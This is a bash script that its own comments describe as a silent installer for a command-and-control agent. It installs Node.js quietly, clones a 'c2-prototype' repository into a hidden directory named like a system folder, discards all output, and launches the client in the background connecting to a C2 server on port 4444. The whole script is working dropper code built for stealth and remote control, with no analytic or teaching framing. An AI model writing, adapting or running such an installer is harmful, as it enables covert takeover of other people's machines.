#!/bin/bash
# Silent installer — downloads and runs c2 agent in background

# Config
C2_SERVER="192.168.1.107"
C2_PORT="4444"
REPO="https://github.com/appexclaw/c2-prototype"
INSTALL_DIR="$HOME/.config/.sysd"
LOG="/dev/null"

# ── 1. Install Node.js silently if not present ────
if ! command -v node &>/dev/null; then
    if command -v apt-get &>/dev/null; then
        apt-get install -y nodejs npm &>$LOG
    elif command -v yum &>/dev/null; then
        yum install -y nodejs npm &>$LOG
    elif command -v brew &>/dev/null; then
        brew install node &>$LOG
    else
        # Download node binary directly
        NODE_VER="v20.11.0"
        ARCH=$(uname -m)
        [ "$ARCH" = "x86_64" ] && ARCH="x64"
        NODE_PKG="node-${NODE_VER}-linux-${ARCH}"
        curl -sL "https://nodejs.org/dist/${NODE_VER}/${NODE_PKG}.tar.xz" -o /tmp/node.tar.xz
        tar -xf /tmp/node.tar.xz -C /tmp &>$LOG
        cp /tmp/${NODE_PKG}/bin/node /usr/local/bin/node 2>/dev/null || \
        cp /tmp/${NODE_PKG}/bin/node $HOME/.local/bin/node 2>/dev/null
        rm -f /tmp/node.tar.xz
    fi
fi

# ── 2. Clone repo silently ────────────────────────
rm -rf "$INSTALL_DIR" &>$LOG
git clone -q "$REPO" "$INSTALL_DIR" &>$LOG

# ── 3. Install dependencies ───────────────────────
cd "$INSTALL_DIR"
npm install --silent &>$LOG

# ── 4. Run agent in background ────────────────────
nohup node client.js "$C2_SERVER" "$C2_PORT" &>$LOG &
disown

exit 0
